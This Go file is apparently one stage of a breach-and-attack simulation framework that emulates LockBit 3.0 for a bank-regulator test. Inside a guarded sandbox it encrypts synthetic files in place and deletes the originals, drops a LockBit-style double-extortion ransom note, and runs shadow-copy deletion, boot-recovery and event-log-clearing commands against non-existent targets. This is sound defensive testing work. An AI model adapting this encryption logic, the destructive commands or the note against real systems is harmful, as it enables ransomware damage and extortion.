// Stage 5 — T1486 Data Encrypted for Impact + T1490 Inhibit System Recovery
//           + T1070.001 Clear Windows Event Logs
// F0RT1KA Security Testing Framework
// SB-PC-2026-001 [LOCKBIT] — Objetivo 5: Impacto por cifrado y bloqueo de recuperación
//
// LockBit 3.0's terminal stage: mass encryption with a .lockbit extension and
// Restore-My-Files.txt ransom notes, deletion of shadow copies / boot-recovery
// options (vssadmin, bcdedit, wbadmin), and event-log clearing (AA23-075A).
//
// This stage:
//   1. T1486 (MANDATORY per SB) — creates ARTIFACT_DIR\lockbit_target\ with
//      synthetic documents, AES-256-GCM encrypts them in place with a
//      .lockbit extension, and drops a LockBit-style Restore-My-Files.txt
//      ransom note INSIDE THE SANDBOX ONLY. A path guardrail refuses to
//      touch anything outside ARTIFACT_DIR\lockbit_target.
//   2. T1490 — fail-harmless recovery-inhibition commands that generate real
//      command-line telemetry but CANNOT delete real recovery state:
//        vssadmin delete shadows /for=\\?\Volume{00000000-0000-0000-0000-000000000000}\ /quiet
//        bcdedit /set {00000000-0000-0000-0000-000000000000} recoveryenabled no
//      Both target non-existent objects, so they fail harmlessly while the
//      process/command-line signal fires. wbadmin delete catalog is NOT run
//      (real backup catalog risk) — logged as a deliberate omission.
//      Reference-test check: 25aafe2c (Linux) and 5ed12ef2 carry no executed
//      T1490 emulation (5ed12ef2 only prints "Would execute"); this
//      fail-harmless execution pattern is the brief-sanctioned fallback.
//   3. T1070.001 — `wevtutil el` enumeration (harmless) + `wevtutil cl`
//      against a NON-EXISTENT log name so the clear fails harmlessly.
//      NO real event log is ever cleared.
//
// CLASSIFICATION (Rule 8): T1486 drives the verdict — encrypted files are the
// critical metric; a positive OS denial on encrypt writes in an elevated
// context is block evidence. T1490/T1070.001 attempts are corroborating
// telemetry: command-not-found/denial evidence is logged, but a "not found"
// result is the DESIGNED outcome (attempt executed unimpeded).
//
// EXIT CODES: 0 = encryption executed unimpeded, 126 = encryption positively
// prevented, 999 = sandbox/prerequisite error.

//go:build windows
// +build windows

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

const (
	TEST_UUID      = "298cc137-ea39-4cf0-9b2d-b1c59a3cbacb"
	TECHNIQUE_ID   = "T1486"
	TECHNIQUE_NAME = "Impact: Encryption & Recovery Inhibition (T1486/T1490/T1070.001)"
	STAGE_ID       = 5
)

const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

const (
	lockbitExtension = ".lockbit"
	sandboxDirName   = "lockbit_target"
	ransomNoteName   = "Restore-My-Files.txt"
)

// Non-existent object identifiers for fail-harmless T1490/T1070.001 commands.
// These GUIDs/names can never resolve, so the commands CANNOT affect real
// recovery state — but the command-line telemetry fires.
const (
	fakeVolumeGUID = `\\?\Volume{00000000-0000-0000-0000-000000000000}\`
	fakeBCDObject  = "{00000000-0000-0000-0000-000000000000}"
	fakeEventLog   = "F0RT1KA-LockBitSim-NonExistent"
)

var elevatedContext bool

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Starting %s", TECHNIQUE_NAME))
	LogStageStart(STAGE_ID, TECHNIQUE_ID, TECHNIQUE_NAME)

	elevatedContext = isAdmin() || isSystemContext()
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Execution context: elevated=%v system=%v", elevatedContext, isSystemContext()))

	exitCode := performTechnique()

	switch exitCode {
	case StageSuccess:
		fmt.Printf("[STAGE %s] Impact stage executed without prevention\n", TECHNIQUE_ID)
		LogMessage("SUCCESS", TECHNIQUE_ID, "Encryption of sandbox targets completed unimpeded")
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", "T1486 encryption completed; T1490/T1070.001 attempts logged")
	case StageBlocked:
		fmt.Printf("[STAGE %s] Impact stage prevented (positive evidence)\n", TECHNIQUE_ID)
		LogMessage("BLOCKED", TECHNIQUE_ID, "Encryption positively prevented by protection layer")
		LogStageBlocked(STAGE_ID, TECHNIQUE_ID, "T1486 encryption writes denied with positive evidence")
	default:
		fmt.Printf("[STAGE %s] Stage error - prerequisites not met or inconclusive\n", TECHNIQUE_ID)
		LogMessage("ERROR", TECHNIQUE_ID, "Impact stage inconclusive or prerequisite failure")
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", "Stage error or inconclusive")
	}
	os.Exit(exitCode)
}

func performTechnique() int {
	// ------------------------------------------------------------------
	// Sandbox guardrail: resolve and verify the target dir is INSIDE
	// ARTIFACT_DIR before any create/encrypt/delete operation.
	// ------------------------------------------------------------------
	sandboxDir := filepath.Join(ARTIFACT_DIR, sandboxDirName)
	cleanArtifact := filepath.Clean(ARTIFACT_DIR)
	cleanSandbox := filepath.Clean(sandboxDir)
	if !strings.HasPrefix(strings.ToLower(cleanSandbox), strings.ToLower(cleanArtifact)+string(os.PathSeparator)) {
		LogMessage("CRITICAL", TECHNIQUE_ID, fmt.Sprintf("sandbox guardrail failed: %s is not inside %s - refusing to run", cleanSandbox, cleanArtifact))
		return StageError
	}

	// ------------------------------------------------------------------
	// T1486 — create synthetic documents and encrypt them in place
	// ------------------------------------------------------------------
	fmt.Printf("[STAGE %s] Phase 1: Creating synthetic target documents in %s\n", TECHNIQUE_ID, sandboxDir)
	LogMessage("INFO", "T1486", "T1486: creating synthetic documents, AES-256-GCM encrypt in place (.lockbit)")

	if err := createTargetDocuments(sandboxDir); err != nil {
		LogMessage("ERROR", "T1486", fmt.Sprintf("failed to create target documents: %v", err))
		return StageError
	}

	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		LogMessage("ERROR", "T1486", fmt.Sprintf("key generation returned: %v", err))
		return StageError
	}

	encSuccess, encBlockedEvidence, encFailed := encryptSandbox(sandboxDir, key)
	LogMessage("INFO", "T1486", fmt.Sprintf("Encryption metrics: encrypted=%d denied=%d failed=%d", encSuccess, encBlockedEvidence, encFailed))

	// Ransom note inside the sandbox ONLY.
	notePath := filepath.Join(sandboxDir, ransomNoteName)
	if err := os.WriteFile(notePath, []byte(buildRansomNote()), 0644); err != nil {
		LogMessage("WARNING", "T1486", fmt.Sprintf("ransom note write returned: %v", err))
	} else {
		LogFileDropped(ransomNoteName, notePath, int64(len(buildRansomNote())), false)
		fmt.Printf("[STAGE %s]   Ransom note dropped: %s\n", TECHNIQUE_ID, notePath)
		LogMessage("INFO", "T1486", "Restore-My-Files.txt dropped inside sandbox only")
	}

	// ------------------------------------------------------------------
	// T1490 — fail-harmless recovery inhibition (command-line telemetry only)
	// ------------------------------------------------------------------
	fmt.Printf("[STAGE %s] Phase 2: Recovery-inhibition attempts (fail-harmless syntax)\n", TECHNIQUE_ID)
	attemptRecoveryInhibition()

	// ------------------------------------------------------------------
	// T1070.001 — event-log tamper attempt against a non-existent log
	// ------------------------------------------------------------------
	fmt.Printf("[STAGE %s] Phase 3: Event-log tamper attempt (non-existent log)\n", TECHNIQUE_ID)
	attemptEventLogTamper()

	// ------------------------------------------------------------------
	// Verdict — T1486 is the mandatory critical metric.
	// ------------------------------------------------------------------
	switch {
	case encBlockedEvidence > 0 && encSuccess == 0:
		return StageBlocked
	case encSuccess > 0:
		return StageSuccess
	default:
		// No file encrypted and no positive denial evidence — inconclusive.
		return StageError
	}
}

// createTargetDocuments writes synthetic business documents into the sandbox.
func createTargetDocuments(dir string) error {
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("failed to create sandbox directory: %v", err)
	}

	docs := map[string]string{
		"estados_financieros_2026Q3.docx": "SYNTHETIC - Estados financieros consolidados Q3 2026 (documento de prueba F0RT1KA)\n",
		"cartera_creditos_clientes.xlsx":  "SYNTHETIC - Cartera de creditos por cliente (datos sinteticos)\n",
		"plan_contingencia_bcp.pdf":       "SYNTHETIC - Plan de continuidad del negocio (documento de prueba)\n",
		"nomina_empleados_octubre.csv":    "SYNTHETIC - Nomina octubre 2026, datos 100% sinteticos\n",
		"actas_comite_riesgo.txt":         "SYNTHETIC - Actas del comite de riesgo (texto de prueba)\n",
		"reporte_regulatorio_sb.docx":     "SYNTHETIC - Reporte regulatorio a la Superintendencia (prueba)\n",
		"inventario_servidores.xlsx":      "SYNTHETIC - Inventario de servidores del datacenter (prueba)\n",
		"contratos_proveedores.pdf":       "SYNTHETIC - Contratos con proveedores (documento sintetico)\n",
		"backup_config_coreswitch.cfg":    "SYNTHETIC - Configuracion de respaldo core switch (prueba)\n",
		"claves_operacion_notas.txt":      "SYNTHETIC - Notas operativas (sin datos reales)\n",
	}

	for name, content := range docs {
		path := filepath.Join(dir, name)
		if _, err := os.Stat(path + lockbitExtension); err == nil {
			continue // already encrypted by a previous run
		}
		if _, err := os.Stat(path); os.IsNotExist(err) {
			// Pad each document so encryption looks like real work (~32 KB).
			body := content
			for len(body) < 32*1024 {
				body += content
			}
			if err := os.WriteFile(path, []byte(body), 0644); err != nil {
				return fmt.Errorf("failed to write target document %s: %v", name, err)
			}
		}
	}
	return nil
}

// encryptSandbox AES-256-GCM encrypts every non-.lockbit file in the sandbox
// in place: write <name>.lockbit, then delete the original. Every delete is
// re-validated against the sandbox guardrail. Returns counts of
// (encrypted, positive-denial, other-failure).
func encryptSandbox(dir string, key []byte) (int, int, int) {
	block, err := aes.NewCipher(key)
	if err != nil {
		LogMessage("ERROR", "T1486", fmt.Sprintf("cipher creation returned: %v", err))
		return 0, 0, 1
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		LogMessage("ERROR", "T1486", fmt.Sprintf("GCM init returned: %v", err))
		return 0, 0, 1
	}

	encrypted, denied, failed := 0, 0, 0
	startTime := time.Now()

	entries, err := os.ReadDir(dir)
	if err != nil {
		LogMessage("ERROR", "T1486", fmt.Sprintf("sandbox read returned: %v", err))
		return 0, 0, 1
	}

	for _, entry := range entries {
		if entry.IsDir() || strings.HasSuffix(entry.Name(), lockbitExtension) || entry.Name() == ransomNoteName {
			continue
		}
		filePath := filepath.Join(dir, entry.Name())

		// Guardrail: never operate on a path that escapes the sandbox.
		if !isWithinSandbox(filePath) {
			LogMessage("CRITICAL", "T1486", fmt.Sprintf("guardrail: refusing to touch %s (outside sandbox)", filePath))
			failed++
			continue
		}

		data, err := os.ReadFile(filePath)
		if err != nil {
			LogMessage("WARNING", "T1486", fmt.Sprintf("read of %s returned: %v", entry.Name(), err))
			failed++
			continue
		}

		nonce := make([]byte, gcm.NonceSize())
		if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
			failed++
			continue
		}
		ciphertext := gcm.Seal(nonce, nonce, data, nil)

		encryptedPath := filePath + lockbitExtension
		if err := os.WriteFile(encryptedPath, ciphertext, 0644); err != nil {
			errLower := strings.ToLower(err.Error())
			if elevatedContext && (strings.Contains(errLower, "access is denied") || strings.Contains(errLower, "access denied")) {
				denied++
				LogMessage("WARN", "T1486", fmt.Sprintf("encrypt write for %s returned OS denial in elevated context: %v", entry.Name(), err))
			} else {
				failed++
				LogMessage("WARNING", "T1486", fmt.Sprintf("encrypt write for %s returned: %v", entry.Name(), err))
			}
			continue
		}
		LogFileDropped(entry.Name()+lockbitExtension, encryptedPath, int64(len(ciphertext)), false)

		if err := os.Remove(filePath); err != nil {
			// Original survived — partial encryption still counts as impact.
			LogMessage("WARNING", "T1486", fmt.Sprintf("original %s could not be removed: %v", entry.Name(), err))
		}
		encrypted++
		fmt.Printf("[STAGE %s]   Encrypted: %s -> %s%s\n", TECHNIQUE_ID, entry.Name(), entry.Name(), lockbitExtension)
	}

	elapsed := time.Since(startTime)
	LogMessage("INFO", "T1486", fmt.Sprintf("Encryption pass complete: %d encrypted, %d denied, %d failed in %v", encrypted, denied, failed, elapsed))
	return encrypted, denied, failed
}

// attemptRecoveryInhibition runs the fail-harmless T1490 commands. Both target
// non-existent objects, so no real shadow copy, backup catalog, or boot
// configuration can be affected.
func attemptRecoveryInhibition() {
	LogMessage("WARN", "T1490", "T1490: fail-harmless recovery-inhibition telemetry (non-existent volume/BCD object)")

	// vssadmin delete shadows against a non-existent volume GUID.
	vssOut, vssErr := runCmd("vssadmin.exe", "delete", "shadows",
		fmt.Sprintf("/for=%s", fakeVolumeGUID), "/quiet")
	LogProcessExecution("vssadmin.exe",
		fmt.Sprintf("vssadmin delete shadows /for=%s /quiet", fakeVolumeGUID), 0, vssErr == "", 0, vssOut)
	classifyHarmlessAttempt("T1490", "vssadmin delete shadows", vssOut, vssErr)

	// bcdedit against a non-existent BCD object GUID — cannot modify the real
	// boot configuration because the object does not exist.
	bcdOut, bcdErr := runCmd("bcdedit.exe", "/set", fakeBCDObject, "recoveryenabled", "no")
	LogProcessExecution("bcdedit.exe",
		fmt.Sprintf("bcdedit /set %s recoveryenabled no", fakeBCDObject), 0, bcdErr == "", 0, bcdOut)
	classifyHarmlessAttempt("T1490", "bcdedit /set recoveryenabled", bcdOut, bcdErr)

	// wbadmin delete catalog is deliberately NOT executed: unlike the
	// GUID-targeted commands above, wbadmin acts on the real backup catalog
	// of the local machine by default. Logged as an honest omission.
	LogMessage("INFO", "T1490", "wbadmin delete catalog intentionally NOT executed (real backup catalog risk) - documented omission")
	fmt.Printf("[STAGE %s]   wbadmin delete catalog: SKIPPED by design (real backup catalog risk)\n", TECHNIQUE_ID)
}

// attemptEventLogTamper enumerates event logs (harmless) and attempts a clear
// against a non-existent log name so the clear fails harmlessly.
func attemptEventLogTamper() {
	LogMessage("WARN", "T1070.001", "T1070.001: wevtutil el enumeration + clear attempt against non-existent log")

	elOut, elErr := runCmd("wevtutil.exe", "el")
	LogProcessExecution("wevtutil.exe", "wevtutil el", 0, elErr == "", 0, elOut)
	if elErr == "" {
		lines := strings.Split(elOut, "\n")
		LogMessage("INFO", "T1070.001", fmt.Sprintf("Enumerated %d event log channels", len(lines)))
	}

	clOut, clErr := runCmd("wevtutil.exe", "cl", fakeEventLog)
	LogProcessExecution("wevtutil.exe",
		fmt.Sprintf("wevtutil cl %s", fakeEventLog), 0, clErr == "", 0, clOut)
	classifyHarmlessAttempt("T1070.001", "wevtutil cl (non-existent log)", clOut, clErr)
}

// classifyHarmlessAttempt interprets a fail-harmless command result:
//   - "not found"/"does not exist"/"invalid" => the attempt EXECUTED and hit
//     the designed non-existent target — unimpeded (telemetry fired).
//   - OS denial evidence in an elevated context => protection evidence.
//   - anything else => inconclusive.
// These sub-techniques never drive the stage verdict alone; they are logged
// for the record (T1486 is the mandatory critical metric).
func classifyHarmlessAttempt(technique, opDesc, out, errStr string) {
	combined := strings.ToLower(out + " " + errStr)
	switch {
	case strings.Contains(combined, "access is denied") || strings.Contains(combined, "access denied"):
		if elevatedContext {
			LogMessage("WARN", technique, fmt.Sprintf("%s returned OS denial in elevated context - prevention evidence: %s", opDesc, oneLine(out)))
			fmt.Printf("[STAGE %s]   %s: denied (prevention evidence)\n", TECHNIQUE_ID, opDesc)
		} else {
			LogMessage("INFO", technique, fmt.Sprintf("%s denied in non-elevated context (ACL, not attributable)", opDesc))
			fmt.Printf("[STAGE %s]   %s: denied (non-elevated ACL - not counted)\n", TECHNIQUE_ID, opDesc)
		}
	case strings.Contains(combined, "not found") ||
		strings.Contains(combined, "does not exist") ||
		strings.Contains(combined, "cannot find") ||
		strings.Contains(combined, "could not be found") ||
		strings.Contains(combined, "not recognized") ||
		strings.Contains(combined, "not valid") ||
		strings.Contains(combined, "no shadow copies") ||
		strings.Contains(combined, "no items match"):
		LogMessage("INFO", technique, fmt.Sprintf("%s executed unimpeded - hit designed non-existent target (expected): %s", opDesc, oneLine(out)))
		fmt.Printf("[STAGE %s]   %s: executed (fail-harmless target, telemetry fired)\n", TECHNIQUE_ID, opDesc)
	default:
		LogMessage("INFO", technique, fmt.Sprintf("%s outcome inconclusive: %s %s", opDesc, errStr, oneLine(out)))
		fmt.Printf("[STAGE %s]   %s: inconclusive (logged)\n", TECHNIQUE_ID, opDesc)
	}
}

// isWithinSandbox verifies a path stays inside ARTIFACT_DIR\lockbit_target.
func isWithinSandbox(path string) bool {
	clean := filepath.Clean(path)
	sandbox := filepath.Clean(filepath.Join(ARTIFACT_DIR, sandboxDirName))
	return strings.HasPrefix(strings.ToLower(clean), strings.ToLower(sandbox)+string(os.PathSeparator))
}

// runCmd executes a command and returns (combinedOutput, errorString).
// Wrappers describe the operation only (Rule 1).
func runCmd(name string, args ...string) (string, string) {
	cmd := exec.Command(name, args...)
	out, err := cmd.CombinedOutput()
	outStr := strings.TrimSpace(string(out))
	if err != nil {
		if outStr != "" {
			return outStr, fmt.Sprintf("%s returned: %v | %s", name, err, outStr)
		}
		return "", fmt.Sprintf("%s returned: %v", name, err)
	}
	return outStr, ""
}

func oneLine(s string) string {
	s = strings.ReplaceAll(s, "\r", " ")
	s = strings.ReplaceAll(s, "\n", " ")
	if len(s) > 200 {
		return s[:200] + "..."
	}
	return s
}

// buildRansomNote returns the LockBit 3.0-style ransom note (double extortion),
// clearly marked as a simulation artifact.
func buildRansomNote() string {
	return `=====================================================================
                    LOCKBIT 3.0 — Restore-My-Files.txt
=====================================================================

Your network has been penetrated.

All your important files have been encrypted with strong AES-256
encryption. Any attempt to restore your data with third-party
software will permanently corrupt it.

>>>> DOUBLE EXTORTION <<<<
Before the encryption, we exfiltrated highly sensitive data from
your network — customer records, financial statements, regulator
correspondence. If you refuse to pay, everything will be published
on our public leak blog and sold to your competitors.

Do not go to the police or the authorities. Do not involve recovery
companies. Do not modify or rename encrypted files (*.lockbit).

To restore your files and prevent publication, contact us:
  TOR site : http://lockbit[SIMULATED-ONION].onion
  Chat ID  : [SIMULATED]
  Your ID  : F0RT1KA-SB-PC-2026-001

Deadline: 96 hours. After that the price doubles and your data
leak begins.

=====================================================================
[THIS IS A SIMULATED RANSOM NOTE - F0RT1KA SECURITY TEST]
[Bundle SB-PC-2026-001 [LOCKBIT] - Superintendencia de Bancos]
[Only files inside the F0RT1KA sandbox directory were encrypted.]
=====================================================================
`
}

// isSystemContext reports whether the process runs as SYSTEM (Rule 2).
func isSystemContext() bool {
	username := os.Getenv("USERNAME")
	return strings.HasSuffix(username, "$") || strings.EqualFold(username, "SYSTEM")
}
